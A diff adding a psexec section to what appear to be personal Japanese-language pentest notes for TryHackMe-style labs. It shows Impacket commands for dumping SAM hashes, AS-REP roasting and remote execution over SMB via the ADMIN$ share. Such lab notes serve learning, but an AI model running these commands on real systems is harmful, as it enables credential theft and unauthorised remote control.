@@ -58,3 +58,11 @@ python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -sy
 ```sh
 python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.194.124 controller.local/ -usersfile users.txt
 ```
+
+## psexec
+
+SMB接続できる、かつAdministratorグループに属することが必要。`ADMIN$` 共有への書き込みが必要なため。
+
+```sh
+python3 /usr/share/doc/python3-impacket/examples/psexec.py  <user>@windcorp.thm
+```
